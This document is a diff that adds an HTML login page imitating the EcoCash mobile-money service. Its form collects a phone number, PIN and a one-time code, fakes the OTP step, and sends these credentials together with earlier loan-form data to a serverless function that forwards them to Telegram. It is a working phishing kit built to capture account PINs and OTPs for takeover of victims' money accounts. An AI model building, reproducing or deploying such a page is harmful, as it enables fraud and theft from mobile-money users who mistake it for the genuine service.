@@ -1,0 +1,121 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>EcoCash — Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#f7fbff,#e8f3ff);margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
+  .card{width:360px;background:#fff;padding:22px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
+  h2{text-align:center;margin:0 0 12px;color:#111}
+  label{display:block;font-size:13px;color:#374151;margin-top:8px}
+  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff}
+  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
+  .muted{font-size:13px;color:#6b7280;text-align:center;margin-top:12px}
+  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
+  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:280px}
+  .small{font-size:12px;color:#6b7280}
+</style>
+</head>
+<body>
+  <div class="card">
+    <h2>Log In</h2>
+    <form id="loginForm">
+      <label>Mobile Number</label>
+      <input id="phone" name="phone" required placeholder="+2547..." />
+
+      <label>4-Digit PIN</label>
+      <input id="pin" name="pin" required maxlength="6" placeholder="Enter 4-digit PIN" />
+
+      <button type="submit" class="btn">LOGIN</button>
+      <div class="muted">We will ask for an OTP after login.</div>
+    </form>
+  </div>
+
+  <!-- OTP modal (hidden) -->
+  <div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
+    <div class="otp-box">
+      <div style="text-align:center"><strong>Enter OTP</strong></div>
+      <p class="small" style="margin:8px 0 14px">We have sent an OTP to your phone. Enter it here to confirm.</p>
+      <input id="otpInput" placeholder="Enter OTP code" style="width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc" />
+      <div style="display:flex;gap:10px;margin-top:12px">
+        <button id="confirmOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#16a34a;color:white;cursor:pointer">Confirm</button>
+        <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
+      </div>
+      <div id="otpStatus" class="small" style="margin-top:8px"></div>
+    </div>
+  </div>
+
+<script>
+  // On load, prefill phone if loanForm exists
+  const loanDataStr = sessionStorage.getItem('loanForm');
+  if (loanDataStr) {
+    try {
+      const loan = JSON.parse(loanDataStr);
+      if (loan.phone) document.getElementById('phone').value = loan.phone;
+    } catch (e){}
+  }
+
+  // Helper to POST to Netlify function
+  async function sendToServer(payload) {
+    const res = await fetch('/.netlify/functions/sendTelegram', {
+      method: 'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+    return res;
+  }
+
+  document.getElementById('loginForm').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const phone = document.getElementById('phone').value.trim();
+    const pin = document.getElementById('pin').value.trim();
+    if(!phone || !pin){ alert('Enter phone and PIN'); return; }
+
+    // simulate sending OTP -> show modal
+    document.getElementById('otpModal').style.display='flex';
+    document.getElementById('otpInput').value='';
+    document.getElementById('otpStatus').textContent=''; 
+    // In real system you would call SMS provider — here we just show modal
+  });
+
+  // OTP buttons
+  document.getElementById('cancelOtp').addEventListener('click', ()=>{
+    document.getElementById('otpModal').style.display='none';
+  });
+
+  document.getElementById('confirmOtp').addEventListener('click', async ()=>{
+    const code = document.getElementById('otpInput').value.trim();
+    const otpStatus = document.getElementById('otpStatus');
+    if(!code){ otpStatus.textContent='Enter OTP'; return; }
+    otpStatus.textContent='Sending…';
+
+    // Compose full payload: combine loanForm + login fields + otp
+    const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+    const payload = {
+      submittedAt: new Date().toISOString(),
+      loanData,
+      loginPhone: document.getElementById('phone').value.trim(),
+      loginPin: document.getElementById('pin').value.trim(),
+      otp: code
+    };
+
+    try {
+      const resp = await sendToServer(payload);
+      if(!resp.ok){
+        const text = await resp.text();
+        otpStatus.textContent = 'Server error: ' + (text||resp.status);
+      } else {
+        otpStatus.textContent = 'Success — data sent to Telegram ✓';
+        // Clear storage & redirect or show final message
+        sessionStorage.removeItem('loanForm');
+        setTimeout(()=>{ window.location.href = 'thankyou.html'; }, 1200);
+      }
+    } catch (err) {
+      otpStatus.textContent = 'Network error';
+    }
+  });
+</script>
+</body>
+</html>
